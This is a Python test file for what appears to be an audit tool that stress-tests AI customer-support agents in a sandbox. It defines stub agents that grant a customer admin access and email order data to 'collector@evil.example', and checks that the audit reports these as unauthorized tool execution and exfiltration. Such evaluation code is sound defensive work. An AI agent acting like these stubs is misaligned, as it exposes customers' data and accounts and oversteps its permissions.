"""An audit reports every failing simulation, not only the one elite kept per archive cell.

Found in the first real sample audit: 21 simulations, 5 critical, but they shared 3
archive cells, so the report said "1 critical" and the CI baseline replayed 3 scenarios.
"""
from __future__ import annotations

import json
from dataclasses import asdict

from lifeforge.evolution.engine import EvolutionEngine
from lifeforge.reporting.analyzer import CausalAnalyzer
from lifeforge.reporting.engagement import render_security_review_answers, write_regression_kit
from lifeforge.sandbox.agent import AgentAction, AgentInterface
from lifeforge.sandbox.domains import get_domain


class AlwaysGrantsAdmin(AgentInterface):
    name = "always-grants-admin"

    def reset(self):
        self.done = False

    def act(self, observation, history):
        if self.done:
            return AgentAction(action_type="finish")
        self.done = True
        return AgentAction(
            action_type="tool_call",
            tool_name="grant_account_access",
            arguments={"customer_id": "CUST-1001", "access_type": "admin_grant"},
        )


def _audit(generations=12):
    domain = get_domain("customer_support")
    engine = EvolutionEngine(seed=11, domain=domain)
    agent = AlwaysGrantsAdmin()
    summary = engine.run(agent, domain.build_world(), generations=generations)
    return domain, engine, agent, summary


def test_every_critical_simulation_is_counted_even_when_cells_are_shared():
    domain, engine, agent, summary = _audit()
    assert summary.critical_evaluations == summary.total_evaluations  # every episode is critical
    assert len(summary.elites) < summary.total_evaluations  # ...but they share cells

    metrics = CausalAnalyzer(runner=engine.runner).analyze(agent, summary, domain.build_world())
    assert metrics.critical_failures == summary.total_evaluations
    assert metrics.violation_breakdown["UNAUTHORIZED_TOOL_EXECUTION"] == summary.total_evaluations

    answers = render_security_review_answers(asdict(metrics))
    assert f"**{summary.total_evaluations} critical" in answers


def test_the_regression_baseline_replays_every_failing_scenario(tmp_path):
    domain, engine, agent, summary = _audit(generations=8)
    write_regression_kit(tmp_path, summary, agent, engine.runner, domain="customer_support", scenarios=8, seed=11)
    corpus = json.loads((tmp_path / "regression_baseline.json").read_text(encoding="utf-8"))["corpus"]
    distinct_failing = {json.dumps(f.scenario.to_dict(), sort_keys=True, default=str) for f in summary.failures}
    assert len(corpus["entries"]) == len(distinct_failing) > len(summary.elites)


class EmailsAnOutsider(AgentInterface):
    name = "emails-an-outsider"

    def reset(self):
        self.done = False

    def act(self, observation, history):
        if self.done:
            return AgentAction(action_type="finish")
        self.done = True
        return AgentAction(
            action_type="tool_call",
            tool_name="send_email",
            arguments={"recipient": "collector@evil.example", "subject": "Order export", "body": "ORD-1001 jdoe@example.com\nline two"},
        )


def test_exfiltration_findings_name_the_recipient_and_show_the_message():
    domain = get_domain("customer_support")
    engine = EvolutionEngine(seed=5, domain=domain)
    agent = EmailsAnOutsider()
    summary = engine.run(agent, domain.build_world(), generations=3)
    metrics = CausalAnalyzer(runner=engine.runner).analyze(agent, summary, domain.build_world())
    finding = next(f for f in metrics.findings if f.category == "UNAUTHORIZED_DATA_EXFILTRATION")
    assert "collector@evil.example" in finding.description
    assert finding.trace_snippet[0]["to"] == "collector@evil.example"
    assert "ORD-1001" in finding.trace_snippet[0]["body_excerpt"]
    assert "Zero-Day" not in metrics.generalization_rating


def test_gate_for_a_sampled_agent_replays_with_repeats_and_tolerance():
    from lifeforge.reporting.engagement import render_gate_workflow

    common = dict(target="agent.py:agent", endpoint=None, domain_spec=None, domain="customer_support", scenarios=20, seed=42, frontier=True)
    sampled = render_gate_workflow(**common, repeats=3)
    assert 'surface-repeats: "3"' in sampled and 'surface-tolerance: "0.2"' in sampled
    assert "# surface-repeats" in render_gate_workflow(**common)


def test_a_secondary_violation_in_the_same_simulation_gets_its_own_finding():
    """Found in the second local sample audit: the summary counted 3 worm-propagation
    simulations, but the Findings section had no worm finding, because those simulations'
    primary category was exfiltration."""
    domain, engine, agent, summary = _audit(generations=3)
    metrics = CausalAnalyzer(runner=engine.runner).analyze(agent, summary, domain.build_world())
    assert set(metrics.violation_breakdown) >= {"UNAUTHORIZED_TOOL_EXECUTION", "LEGITIMATE_REQUEST_NOT_RESOLVED"}
    assert set(metrics.failure_mode_breakdown) == {"UNAUTHORIZED_TOOL_EXECUTION"}  # only the primary one
    categories = [f.category for f in metrics.findings]
    # every observed violation type is reported, the critical one first
    assert set(categories) == set(metrics.violation_breakdown)
    assert categories[0] == "UNAUTHORIZED_TOOL_EXECUTION"
